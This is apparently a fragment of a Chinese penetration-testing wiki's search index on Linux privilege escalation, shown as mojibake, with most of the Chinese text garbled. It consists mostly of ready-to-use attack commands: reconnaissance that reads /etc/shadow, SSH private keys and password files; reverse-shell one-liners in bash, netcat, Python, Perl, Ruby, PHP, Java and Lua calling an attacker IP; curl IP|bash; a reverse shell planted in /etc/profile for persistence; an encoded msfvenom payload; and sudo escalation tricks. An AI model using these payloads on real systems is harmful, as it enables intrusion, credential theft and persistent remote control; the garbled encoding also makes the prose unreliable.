dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚æˆ‘ä»¬â½‡å¸¸ç›´æ¥ä½¿â½¤çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯/bin/ls"},{"title":"ææƒ","path":"/wiki/å†…ç½‘/ææƒ/index.html","content":"Linuxææƒ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Lin_ä¿¡æ¯æ”¶é›† ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Mimikatzæ•™ç¨‹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ windows ææƒ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ windowsææƒ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Win_ä¿¡æ¯æ”¶é›† ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"Linuxææƒ","path":"/wiki/å†…ç½‘/ææƒ/Linuxææƒ.html","content":"åŸºç¡€çŸ¥è¯†ä¿¡æ¯æ”¶é›†æ“ä½œç³»ç»Ÿ| plain uname -a # æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯ uname -r # å†…æ ¸ç‰ˆæœ¬ uname -n # ç³»ç»Ÿä¸»æœºåã€‚ uname -m # æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰ uname -mrs # æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰ hostname # ç³»ç»Ÿä¸»æœºå cat /proc/version # å†…æ ¸ä¿¡æ¯ cat /etc/*-release # åˆ†å‘ä¿¡æ¯ cat /etc/issue # åˆ†å‘ä¿¡æ¯ cat /proc/cpuinfo # CPUä¿¡æ¯ cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based ls /boot | grep vmlinuz-\t# å†…æ ¸ç‰ˆæœ¬ || â€” | ç¯å¢ƒå˜é‡ plain env # æ˜¾ç¤ºç¯å¢ƒå˜é‡ set # ç°å®ç¯å¢ƒå˜é‡ echo %PATH # è·¯å¾„ä¿¡æ¯ history # æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½• pwd # è¾“å‡ºå·¥ä½œç›®å½• cat /etc/profile # æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿå˜é‡ cat /etc/shells # æ˜¾ç¤ºå¯ç”¨çš„shellrc cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout cat /proc/??/environ # ??è¡¨ç¤ºä¸¤ä¸ªç¬¦å· æ‰“å°æœºæœåŠ¡ plain lpstat -a ç”¨æˆ·å’Œç¾¤ç»„| plain cat /etc/passwd # åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ· cat /var/mail/root cat /var/spool/mail/root cat /etc/group # åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç»„ grep -v -E ^# /etc/passwd | awk -F: $3 == 0 { print $1} # åˆ—å‡ºæ‰€æœ‰çš„è¶…çº§ç”¨æˆ·è´¦æˆ· whoami # æŸ¥çœ‹å½“å‰ç”¨æˆ· w # è°ç›®å‰å·²ç™»å½•ï¼Œä»–ä»¬æ­£åœ¨åšä»€ä¹ˆ last # æœ€åç™»å½•ç”¨æˆ·çš„åˆ—è¡¨ lastlog # æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯ lastlog â€“u %username% # æœ‰å…³æŒ‡å®šç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯ lastlog |grep -v Never # ä»¥å‰ç™»å½•ç”¨æˆ·çš„å®Œæ•´ä¿¡æ¯ || â€” | ç”¨æˆ·æƒé™ä¿¡æ¯ plain whoami å½“å‰ç”¨æˆ·å id å½“å‰ç”¨æˆ·ä¿¡æ¯ cat /etc/sudoers è°è¢«å…è®¸ä»¥rootèº«ä»½æ‰§è¡Œ sudo -l å½“å‰ç”¨æˆ·å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œæ“ä½œ è¿›ç¨‹å’ŒæœåŠ¡ plain ps aux ps -ef top cat /etc/services æŸ¥çœ‹ä»¥ root è¿è¡Œçš„è¿›ç¨‹ | plain ps aux | grep root ps -ef | grep root || â€” | æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l æœåŠ¡æ’ä»¶æ£€æŸ¥æœ‰æ²¡æœ‰ä¸å®‰å…¨çš„æœåŠ¡é…ç½®ï¼Œå’Œä¸€äº›æœ‰æ¼æ´çš„æ’ä»¶ã€‚ | plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk $1 ~ /^.*r.*/ || â€” | è®¡åˆ’ä»»åŠ¡| plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root || â€” | æœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç | plain grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find , -name *.php -print0 | xargs -0 grep -i -n var $password || â€” | æ¯”å¦‚è¯´å¯èƒ½ä½¿ç”¨é‚®ä»¶æ˜æ–‡ä¼ è¾“å¯†ç ï¼› åˆæˆ–è€…è¯´ MySQL ä¸­æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç ã€‚ æœ‰æ—  ssh ç§é’¥ plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key æŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœº| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || â€” | æ—¥å¿—æ–‡ä»¶ plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp æ•æ„Ÿæ–‡ä»¶ plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ ç‰¹æ®Šçš„æ•°æ®åº“ã€é…ç½®æ–‡ä»¶ plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg äº¤äº’å¼shell plain python -c import pty;pty.spawn(/bin/bash) echo os.system(/bin/bash) /bin/sh -i æŸ¥çœ‹å®‰è£…è¿‡çš„å·¥å…· plain find / -name perl* find / -name python* find / -name gcc* ... é€šè®¯ä¸ç½‘ç»œç³»ç»Ÿæœ‰å“ªäº› NICï¼Ÿå®ƒæ˜¯å¦è¿æ¥åˆ°å¦ä¸€ä¸ªç½‘ç»œï¼Ÿ plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network ç½‘ç»œé…ç½®è®¾ç½®æ˜¯ä»€ä¹ˆï¼Ÿä½ èƒ½ä»è¿™ä¸ªç½‘ç»œä¸­æ‰¾åˆ°ä»€ä¹ˆï¼ŸDHCPæœåŠ¡å™¨ï¼ŸåŸŸåæœåŠ¡å™¨ï¼Ÿç½‘å…³ï¼Ÿ plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname è¿˜æœ‰å“ªäº›å…¶ä»–ç”¨æˆ·å’Œä¸»æœºæ­£åœ¨ä¸ç³»ç»Ÿé€šä¿¡ï¼Ÿ| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || â€” | ç¼“å­˜äº†ä»€ä¹ˆï¼ŸIP å’Œæˆ– MAC åœ°å€ plain arp -e route /sbin/route -nee æ•°æ®åŒ…å—…æ¢å¯èƒ½å—ï¼Ÿèƒ½çœ‹åˆ°ä»€ä¹ˆï¼Ÿ plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 å¯ææƒSUID GUIDå‚è€ƒèµ„æ–™https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ plain find / -perm -1000 -type d 2/dev/null # Sticky bit find / -perm -g=s -type f 2/dev/null # SGID (chmod 2000) find / -perm -u=s -type f 2/dev/null # SUID (chmod 4000) find / -perm -g=s -o -perm -u=s -type f 2/dev/null # SGID or SUID for i in `locate -r bin$`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2/dev/null; done # æŸ¥æ‰¾ /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin æˆ–è€…æ˜¯ *bin æ˜¯å¦å­˜åœ¨ SGID or SUID ï¼ˆå¿«é€ŸæœæŸ¥æ–¹å¼ï¼‰ # ä» root (/) å¼€å§‹æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ SGID or SUID, not Symbolic links, æ–‡ä»¶å¤¹æ·±åº¦ä¸º 3(å¯ä»¥æ›´æ”¹), å¹¶åˆ—å‡ºé”™è¯¯ä¿¡æ¯ (ä¾‹å¦‚ permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2/dev/null æŸ¥çœ‹å¯å†™æ‰§è¡Œç›®å½• plain find / -writable -type d 2/dev/null # world-writeable folders find / -perm -222 -type d 2/dev/null # world-writeable folders find / -perm -o w -type d 2/dev/null # world-writeable folders find / -perm -o x -type d 2/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null # world-writeable executable folders proc ç›®å½•Linux ç³»ç»Ÿä¸Šçš„ font style=color:rgb(68, 68, 68);/proc/font ç›®å½•æ˜¯ä¸€ç§æ–‡ä»¶ç³»ç»Ÿï¼Œå³ proc æ–‡ä»¶ç³»ç»Ÿã€‚ä¸å…¶å®ƒå¸¸è§çš„æ–‡ä»¶ç³»ç»Ÿä¸åŒçš„æ˜¯ï¼Œfont style=color:rgb(68, 68, 68);/proc/font æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚ ä½†éœ€è¦æ³¨æ„ï¼Œéƒ¨åˆ†å†…å®¹éœ€è¦æƒé™æ‰å¯ä»¥è¯»å–ã€‚ plain /proc/self/cmdline # å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ /proc/self/cwd # æŒ‡å‘å½“å‰è¿›ç¨‹è¿è¡Œçš„å·¥ä½œåŒºçš„ç¬¦å·é“¾æ¥ /proc/self/exe # æŒ‡å‘å¯åŠ¨å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ç¬¦å·é“¾æ¥ /proc/self/envrion # æŸ¥çœ‹è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ /proc/self/fd/3 # æŸ¥çœ‹è¯»å–è¿‡çš„æ–‡ä»¶ï¼Œè¾“å…¥è¾“å‡ºç¼“å†²åŒº /proc/self/maps # å†…å­˜æ˜ å°„ä¿¡æ¯ åå¼¹shellåå¼¹shellåè·å–æ¨¡æ‹Ÿç»ˆç«¯å„ç§æ–¹æ³•è·å–çš„ shell éƒ½ä¸æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒï¼Œå®ƒä»¬åªæ˜¯æä¾›äº†ä¸€ä¸ªæ ‡å‡†è¾“å…¥ã€‚ä½ ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå³ä½¿æˆ‘ä»¬è·å¾—äº†ç›®æ ‡è™šæ‹Ÿç»ˆç«¯çš„æ§åˆ¶æƒé™ï¼Œä½†é€šå¸¸ä¼šé‡åˆ°ä»¥ä¸‹å‡ ä¸ªäº¤äº’æ€§å·®å’Œä¸ç¨³å®šçš„é—®é¢˜ï¼š ç¼ºä¹äº¤äº’æ€§ï¼šè·å–çš„è™šæ‹Ÿç»ˆç«¯æ²¡æœ‰è¶³å¤Ÿçš„äº¤äº’åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ— æ³•ä¸ºæ·»åŠ çš„è´¦æˆ·è®¾ç½®å¯†ç æˆ–æ‰§è¡Œsudoç­‰å‘½ä»¤ã€‚ æ— æ³•æ­£å¸¸æ˜¾ç¤ºé”™è¯¯è¾“å‡ºï¼šæ ‡å‡†çš„é”™è¯¯è¾“å‡ºæ— æ³•æ˜¾ç¤ºï¼Œè¿™å¯¼è‡´æ— æ³•æ­£ç¡®ä½¿ç”¨ä¸€äº›æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆå¦‚vimï¼‰ç­‰å·¥å…·ã€‚ è¿æ¥ä¸ç¨³å®šï¼šè·å–çš„ç›®æ ‡ä¸»æœºçš„è™šæ‹Ÿç»ˆç«¯ä½¿ç”¨éå¸¸ä¸ç¨³å®šï¼Œå¾ˆå®¹æ˜“æ–­å¼€è¿æ¥ï¼Œè¿™ä½¿å¾—æŒç»­ä½¿ç”¨å’Œè¿›è¡Œé•¿æ—¶é—´æ“ä½œå˜å¾—å›°éš¾ã€‚ è§£å†³ä¸Šè¿°é—®é¢˜çš„æ–¹æ³•æ˜¯ä½¿ç”¨Pythonçš„ptyï¼ˆpseudo terminalï¼‰æ ‡å‡†åº“æ¥è·å–ä¸€ä¸ªæ ‡å‡†çš„è™šæ‹Ÿç»ˆç«¯ç¯å¢ƒã€‚é€šè¿‡åœ¨å·²ç»è·å–çš„shellä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªç»ˆç«¯è®¾å¤‡ï¼š plain python -c import pty;pty.spawn(/bin/bash) ä»¥ä¸Šä»£ç å°†è°ƒç”¨font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);pty.spawn()/fontå‡½æ•°ï¼Œå¹¶å°†font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/bin/bash/fontä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç»ˆç«¯ä¼šè¯ã€‚ é€šè¿‡ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä¸€ä¸ªæ›´åŠ äº¤äº’æ€§å¼ºã€å¯æ‰§è¡Œsudoç­‰å‘½ä»¤ä»¥åŠæ­£ç¡®æ˜¾ç¤ºé”™è¯¯è¾“å‡ºçš„æ ‡å‡†ç»ˆç«¯ç¯å¢ƒã€‚ bash åå¼¹# Alicenc -lvvp 12345# Bob/bin/bash -c bash -i /dev/tcp/x.x.x.x/12345 01 Bash åå¼¹ shell TCP plain # Alice nc -lvvp 4242 # Bob sh -i /dev/tcp/127.0.0.1/4242 01 Bash åå¼¹ shell UDP plain # Alice nc -u -lvvp 4242 # Bob sh -i /dev/udp/127.0.0.1/4242 01 ä»¥ä¸‹æ˜¯é’ˆå¯¹Bashåå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼š å‘½ä»¤ å‘½ä»¤è¯¦è§£ font style=color:rgb(51, 51, 51);bash -i/font äº§ç”Ÿä¸€ä¸ªbashäº¤äº’ç¯å¢ƒã€‚ font style=color:rgb(51, 51, 51);/fontï¼ˆå’Œ21 ä¸€ä¸ªæ„æ€ï¼‰ å°†è”åˆç¬¦å·å‰é¢çš„å†…å®¹ä¸åé¢ç›¸ç»“åˆï¼Œç„¶åä¸€èµ·é‡å®šå‘ç»™åè€…ã€‚ font style=color:rgb(51, 51, 51);/dev/tcp/47.xxx.xxx.72/2333/font Linuxç¯å¢ƒä¸­æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼å­˜åœ¨çš„ï¼Œå…¶å®å¤§å®¶ä¸€çœ‹è§è¿™ä¸ªå†…å®¹å°±èƒ½æ˜ç™½ï¼Œå°±æ˜¯è®©ç›®æ ‡ä¸»æœºä¸æ”»å‡»æœº47.xxx.xxx.72çš„2333ç«¯å£å»ºç«‹ä¸€ä¸ªtcpè¿æ¥ã€‚ font style=color:rgb(51, 51, 51);01/font å°†æ ‡å‡†è¾“å…¥ä¸æ ‡å‡†è¾“å‡ºçš„å†…å®¹ç›¸ç»“åˆï¼Œç„¶åé‡å®šå‘ç»™å‰é¢æ ‡å‡†è¾“å‡ºçš„å†…å®¹ã€‚ Bashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼š Bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒå’Œæœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸æ”»å‡»æœº2333ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 2333ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ªTCP 2333ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªBashåå¼¹ç¯å¢ƒã€‚ Curlé…åˆBashåå¼¹shellé¦–å…ˆï¼Œåœ¨æ”»å‡»è€…vpsçš„webç›®å½•é‡Œé¢åˆ›å»ºä¸€ä¸ªfont style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.php/fontæˆ–font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.html/font,å†…å®¹å¦‚ä¸‹ï¼š | plain # Alice echo bash -i /dev/tcp/192.168.64.215/2333 01 index.html # ä¸´æ—¶èµ·WebæœåŠ¡çš„ä¸‰ç§æ–¹æ³• # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # ç›‘å¬ nc -lvvp 2333 # Bob curl 192.168.64.215|bash || â€” | Curl é…åˆ Bash åå¼¹ shell çš„æ–¹å¼åœ¨ CTFï¼ˆCapture The Flagï¼‰é¢˜ç›®ä¸­ç»å¸¸è¢«ä½¿ç”¨ã€‚å…·ä½“çš„å‘½ä»¤æ˜¯ font style=color:rgb(245, 57, 0);curl IP|bash/fontï¼Œå…¶ä¸­çš„ IP å¯ä»¥æ˜¯ä»»æ„æ ¼å¼ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºåè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€å…«è¿›åˆ¶å’ŒäºŒè¿›åˆ¶ç­‰ã€‚ NCåå¼¹netcat -e è¢«é˜‰å‰²çš„è¯ wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificatetar -xvzf netcat-0.7.1.tar.gzcd tar -xvzf netcat-0.7.1.tar.gz./configuremake make installmake clean # Alicenc -lvvp 2333# Bobnetcat 192.168.64.215 2333 -e /bin/bash# nc æ”»å‡»æœºIP æ”»å‡»æœºç›‘å¬çš„ç«¯å£ -e /bin/bash Crontabåå¼¹shellProfileåå¼¹shellå½“ç”¨æˆ·æ‰“å¼€æ–°çš„ bash çª—å£æ—¶ï¼Œfont style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font æ–‡ä»¶ä¸­çš„å†…å®¹ä¼šè¢«æ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font æ–‡ä»¶çš„ä¿®æ”¹éœ€è¦è¿›è¡Œç®¡ç†å‘˜æƒé™æ“ä½œï¼ˆä¾‹å¦‚ä½¿ç”¨ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);sudo/font æˆ–ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ï¼‰ã€‚ plain /bin/bash -i /dev/tcp/192.168.64.215/2333 01 # æœ€åé¢é‚£ä¸ªä¸ºçš„æ˜¯é˜²æ­¢ç®¡ç†å‘˜æ— æ³•è¾“å…¥å‘½ä»¤ MSFåå¼¹shellä½¿ç”¨å‘½ä»¤ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);msfvenom -l/font ç»“åˆå…³é”®å­—è¿‡æ»¤ï¼ˆä¾‹å¦‚ font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/fontï¼‰ï¼Œå¯ä»¥åˆ—å‡ºç¬¦åˆæ¡ä»¶çš„å„ç±»åå¼¹shellä¸€å¥è¯payloadï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š | plain â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# msfvenom -l payloads | grep cmd/unix/reverse || â€” | ä»¥ä¸Šå‘½ä»¤å°†åœ¨æ‰€æœ‰å¯ç”¨çš„payloadä¸­ç­›é€‰å¹¶åˆ—å‡ºç¬¦åˆå…³é”®å­—font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/fontçš„é¡¹ï¼Œè¿™äº›é¡¹åŒ…å«å„ç§åå¼¹shellä¸€å¥è¯payloadçš„ç”Ÿæˆå‚æ•°å’Œé€‰é¡¹ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œmetasploitæ”¯æŒç”Ÿæˆåå¼¹shellä¸€å¥è¯çš„ç±»å‹éå¸¸ä¸°å¯Œï¼Œå¤§å®¶å¯ä»¥ä¾æ®æ¸—é€æµ‹è¯•å¯¹è±¡è‡ªè¡Œé€‰æ‹©ä½¿ç”¨ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬è·å–ä¸€ä¸ªpythonåå¼¹shellçš„ä¸€å¥è¯ï¼š plain â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c exec(__import__(zlib).decompress(__import__(base64).b64decode(__import__(codecs).getencoder(utf-8)(eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=)[0]))) â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lvvp 2333 å¸¸è§è„šæœ¬1. Python python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((x.x.x.x,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/bash,-i]); 2. Perl æ–¹æ³•ä¸€ï¼š perl -e use Socket;$i=x.x.x.x;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i))))open(STDIN,S);open(STDOUT,S);open(STDERR,S);exec(/bin/sh -i);; æ–¹æ³•äºŒï¼š perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,x.x.x.x:5555);STDIN-fdopen($c,r);$~-fdopen($c,w);system$_ while; 3. Ruby æ–¹æ³•ä¸€ï¼š ruby -rsocket -e exit if fork;c=TCPSocket.new(x.x.x.x,5555);while(cmd=c.gets);IO.popen(cmd,r)|io|c.print io.readend æ–¹æ³•äºŒï¼š ruby -rsocket -ef=TCPSocket.open(x.x.x.x,5555).to_i;exec sprintf(/bin/sh -i %d %d 2%d,f,f,f) 4. PHP php -r $sock=fsockopen(x.x.x.x,5555);exec(/bin/bash -i 3 3 23); 5. Java public class Revs /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= /bin/bash,-c,exec 5/dev/tcp/x.x.x.x/5555;cat 5 | while read line; do $line 25 5; done; Process p = r.exec(cmd); p.waitFor(); 6. Lua lua -e require(socket);require(os);t=socket.tcp();t:connect(x.x.x.x,5555);os.execute(/bin/sh -i 3 3 23); æ³¨ï¼šä»¥ä¸Šè„šæœ¬æ˜¯åœ¨ç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œï¼Œå…¶ä¸­ x.x.x.x å‡ä¸ºæ”»å‡»è€…ipï¼Œå¹¶ä¸”éœ€è¦åœ¨æ”»å‡»è€…ä¸»æœºä¸Šè¿›è¡Œç›‘å¬: nc -lvvp 5555 sudoææƒåˆå§‹å°è¯•é€šè¿‡ä½¿ç”¨äº¤æ¢ç”¨æˆ·font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);su/fontå‘½ä»¤ç”Ÿæˆroot sudo su å…¶ä»–æ–¹æ³•æœ‰äº›æ—¶å€™ä¸å…è®¸æ‰§è¡Œ su è®¡åˆ’ï¼Œåˆ™æœ‰è®¸å¤šå…¶ä»–æ–¹æ³•å¯ä»¥å‡çº§ç‰¹æƒï¼š sudo -s sudo -i sudo /bin/bash sudo passwd å¤–å£³é€ƒç”Ÿåºåˆ—ä»¥ä¸‹è¿™äº›ç¨‹åºå¦‚æœè¢«é…ç½®ä½¿ç”¨rootæƒé™å¯åŠ¨ï¼Œä¸”è¯¥ç¬¬ä¸‰æ–¹æœåŠ¡æˆ–è€…ç¨‹åºå­˜åœ¨æ¼æ´æˆ–è€…é…ç½®é—®é¢˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¢«åˆ©ç”¨æ¥è·å¾—rootæƒé™ã€‚** å¹¶ä¸”è¿˜è¦çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç  **å¯ä»¥åˆ©ç”¨sudoææƒçš„å‘½ä»¤å¦‚ä¸‹ ï¼š wgetã€findã€catã€aptã€zipã€xxdã€timeã€tasksetã€gitã€sedã€pipã€edã€tmuxã€scpã€perlã€bashã€lessã€awkã€manã€viã€envã€ftp 